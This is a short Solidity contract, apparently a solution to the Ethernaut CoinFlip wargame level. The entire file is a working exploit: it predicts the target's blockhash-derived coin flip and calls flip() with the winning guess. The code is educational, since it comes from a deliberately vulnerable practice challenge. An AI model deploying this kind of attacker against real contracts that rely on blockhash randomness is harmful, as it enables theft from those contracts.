// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
        function flip(bool) external returns(bool);
}
contract CoinFlipAttacker {

    ICoinFlip public ethernautContact;

    constructor(address _ethernautContract) public {
        ethernautContact = ICoinFlip(_ethernautContract);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        ethernautContact.flip(side);
    }
}